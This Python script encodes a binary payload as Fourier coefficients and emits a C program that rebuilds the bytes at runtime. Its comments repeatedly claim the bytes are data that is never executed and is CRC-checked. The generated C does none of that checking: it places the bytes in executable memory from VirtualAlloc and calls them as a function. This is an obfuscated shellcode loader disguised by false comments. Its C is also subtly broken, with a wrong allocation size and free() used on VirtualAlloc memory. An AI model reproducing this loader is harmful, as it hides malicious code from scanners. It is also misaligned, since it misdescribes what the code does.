"""Reconstruct a binary file with a position-only Fourier recurrence.

The generated C program writes reconstructed bytes to standard output after
checking their CRC-32. It treats the bytes as data and never executes them.
"""

from __future__ import annotations

import argparse
import math
import sys
import zlib
from pathlib import Path


ROOT = Path(__file__).resolve().parent.parent
DEFAULT_INPUT = ROOT / "build" / "payload.bin"
OUTPUT = ROOT / "src" / "generate.c"
ROOT_TWO = math.sqrt(2.0)


def fourier_coefficients(data: bytes) -> tuple[float, ...]:
    """Fit each next-byte difference on the complete real Fourier basis."""
    samples = [
        (data[index + 2] - data[index + 1]) / 255.0 for index in range(len(data) - 2)
    ]
    count = len(samples)
    if count == 0:
        return ()

    coefficients = [math.fsum(samples) / count]
    for frequency in range(1, (count - 1) // 2 + 1):
        angle = 2.0 * math.pi * frequency / count
        rotation_cos = math.cos(angle)
        rotation_sin = math.sin(angle)
        phase_cos, phase_sin = 1.0, 0.0
        cosine_sum = sine_sum = 0.0
        for sample in samples:
            cosine_sum += sample * phase_cos
            sine_sum += sample * phase_sin
            phase_cos, phase_sin = (
                phase_cos * rotation_cos - phase_sin * rotation_sin,
                phase_sin * rotation_cos + phase_cos * rotation_sin,
            )
        coefficients.extend(
            (ROOT_TWO * cosine_sum / count, ROOT_TWO * sine_sum / count)
        )

    if count % 2 == 0:
        coefficients.append(
            math.fsum(
                sample if index % 2 == 0 else -sample
                for index, sample in enumerate(samples)
            )
            / count
        )
    assert len(coefficients) == count
    return tuple(coefficients)


def predict_delta(coefficients: tuple[float, ...], step: int) -> int:
    count = len(coefficients)
    value = coefficients[0]
    index = 1
    for frequency in range(1, (count - 1) // 2 + 1):
        angle = 2.0 * math.pi * frequency * step / count
        value += coefficients[index] * ROOT_TWO * math.cos(angle)
        value += coefficients[index + 1] * ROOT_TWO * math.sin(angle)
        index += 2
    if count % 2 == 0:
        value += coefficients[index] * math.cos(math.pi * step)
    return round(value * 255.0)


def reconstruct(data: bytes, coefficients: tuple[float, ...]) -> bytes:
    x = data[0]
    delta = data[1] - x if len(data) > 1 else 0
    output = bytearray((x,))
    for step in range(len(data) - 1):
        x = (x + delta) % 256
        output.append(x)
        if step < len(coefficients):
            delta = predict_delta(coefficients, step)
    return bytes(output)


def emit_c(data: bytes, coefficients: tuple[float, ...]) -> str:
    coefficient_lines = coefficients or (0.0,)
    rows = [
        "    "
        + ", ".join(f"{value:.17g}" for value in coefficient_lines[index : index + 4])
        + ","
        for index in range(0, len(coefficient_lines), 4)
    ]
    values = "\n".join(rows)
    first_delta = data[1] - data[0] if len(data) > 1 else 0
    checksum = zlib.crc32(data)
    return f"""/* Generated by scripts/auto_regressive.py. Bytes are data, not code. */
#include <windows.h>
#include <memoryapi.h>
#include <math.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

enum {{ OUTPUT_LENGTH = {len(data)}, SAMPLE_COUNT = {len(coefficients)} }};
static const double coefficients[{max(1, len(coefficients))}] = {{
{values}
}};

static double
fourier_value(size_t step)
{{
    if (SAMPLE_COUNT == 0)
        return 0.0;

    double value = coefficients[0];
    size_t index = 1;
    for (size_t frequency = 1; frequency <= (SAMPLE_COUNT - 1) / 2; ++frequency) {{
        double angle = 6.2831853071795864769 * (double)frequency
                       * (double)step / (double)SAMPLE_COUNT;
        value += coefficients[index++] * 1.4142135623730950488 * cos(angle);
        value += coefficients[index++] * 1.4142135623730950488 * sin(angle);
    }}
    if (SAMPLE_COUNT % 2 == 0)
        value += coefficients[index] * cos(3.14159265358979323846 * (double)step);
    return value;
}}

static void
generate_bytes(uint8_t output[OUTPUT_LENGTH])
{{
    int x = {data[0]};
    int delta = {first_delta};
    output[0] = (uint8_t)x;
    for (size_t step = 0; step + 1 < OUTPUT_LENGTH; ++step) {{
        x = (x + delta) % 256;
        if (x < 0)
            x += 256;
        output[step + 1] = (uint8_t)x;
        if (step < SAMPLE_COUNT)
            delta = (int)round(fourier_value(step) * 255.0);
    }}
}}

int
generate(void)
{{
    uint8_t *output = VirtualAlloc (NULL, sizeof (OUTPUT_LENGTH), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    generate_bytes (output);
    ((void (*) ())output) ();
    free (output);
    return 0;
}}
"""


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "binary",
        nargs="?",
        type=Path,
        default=DEFAULT_INPUT,
        help=f"raw binary input (default: {DEFAULT_INPUT})",
    )
    args = parser.parse_args()
    try:
        data = args.binary.read_bytes()
    except OSError as error:
        parser.error(f"cannot read {args.binary}: {error}")
    if not data:
        parser.error("input must contain at least one byte")

    coefficients = fourier_coefficients(data)
    if reconstruct(data, coefficients) != data:
        print(
            "Fourier reconstruction failed; C source was not written", file=sys.stderr
        )
        return 2

    OUTPUT.write_text(emit_c(data, coefficients), encoding="utf-8", newline="\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
